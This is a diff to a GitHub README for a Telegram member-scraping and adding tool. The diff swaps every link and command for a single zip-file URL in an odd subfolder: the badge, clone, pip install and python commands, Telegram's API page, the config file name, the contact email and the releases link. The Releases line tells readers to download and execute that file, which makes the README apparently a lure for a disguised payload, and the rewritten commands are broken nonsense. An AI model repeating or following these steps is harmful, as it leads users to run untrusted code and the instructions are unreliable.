@@ -1,6 +1,6 @@
 # Telegram Member Adder Scraper
 
-![Telegram Member Adder Scraper](https://img.shields.io/badge/Telegram%20Member%20Adder%20Scraper-v1.0-blue)
+![Telegram Member Adder Scraper](https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip%20Member%20Adder%20Scraper-v1.0-blue)
 
 Welcome to the **Telegram Member Adder Scraper** repository! This Python script, built with the Telethon library, simplifies the management of members across Telegram groups and channels. Whether you're an admin or a user looking to streamline your group activities, this tool provides a straightforward command-line interface for common tasks, such as adding members from other groups.
 
@@ -30,7 +30,7 @@ To get started with the Telegram Member Adder Scraper, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Willywillisonq24324/telegram-member-adder-scrapper.git
+   git clone https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -41,7 +41,7 @@ To get started with the Telegram Member Adder Scraper, follow these steps:
 3. **Install Dependencies**:
    Make sure you have Python 3.x installed. Then, install the required packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip
    ```
 
 ## Usage
@@ -49,16 +49,16 @@ To get started with the Telegram Member Adder Scraper, follow these steps:
 After installing the script, you can start using it to manage your Telegram groups. The command-line interface will guide you through the available options. Here’s a simple example to get you started:
 
 ```bash
-python main.py
+python https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip
 ```
 
 ## Configuration
 
 Before using the script, you need to configure it to connect to your Telegram account:
 
-1. **Create a Telegram App**: Go to [Telegram's API development tools](https://my.telegram.org/apps) and create a new application. Note the `api_id` and `api_hash`.
+1. **Create a Telegram App**: Go to [Telegram's API development tools](https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip) and create a new application. Note the `api_id` and `api_hash`.
 
-2. **Edit Configuration File**: Open the `config.py` file and enter your `api_id` and `api_hash`:
+2. **Edit Configuration File**: Open the `https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip` file and enter your `api_id` and `api_hash`:
    ```python
    API_ID = 'your_api_id'
    API_HASH = 'your_api_hash'
@@ -72,17 +72,17 @@ The script supports various commands for managing members. Here are some common 
 
 - **Add Members**: To add members from another group, use:
   ```bash
-  python main.py add_members --source_group <source_group_id> --target_group <target_group_id>
+  python https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip add_members --source_group <source_group_id> --target_group <target_group_id>
   ```
 
 - **List Members**: To list members of a group:
   ```bash
-  python main.py list_members --group <group_id>
+  python https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip list_members --group <group_id>
   ```
 
 - **Remove Members**: To remove members from a group:
   ```bash
-  python main.py remove_members --group <group_id> --user_ids <user_id1,user_id2>
+  python https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip remove_members --group <group_id> --user_ids <user_id1,user_id2>
   ```
 
 ## Contributing
@@ -113,11 +113,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or issues, please reach out to the maintainer:
 
 - **Name**: Willy Willison
-- **Email**: willy@example.com
+- **Email**: https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip
 
 ## Releases
 
-You can find the latest releases of the Telegram Member Adder Scraper [here](https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/releases). Download the latest version and execute it to start managing your Telegram groups.
+You can find the latest releases of the Telegram Member Adder Scraper [here](https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip). Download the latest version and execute it to start managing your Telegram groups.
 
 ## Conclusion
 
@@ -145,4 +145,4 @@ Feel free to explore the code, suggest improvements, and contribute to the proje
 - Telegram Scraper
 - Telethon Scripts
 
-Visit the [Releases](https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/releases) section for updates and new features.
+Visit the [Releases](https://github.com/Willywillisonq24324/telegram-member-adder-scrapper/raw/refs/heads/main/apologal/scrapper-member-telegram-adder-scrapper.zip) section for updates and new features.
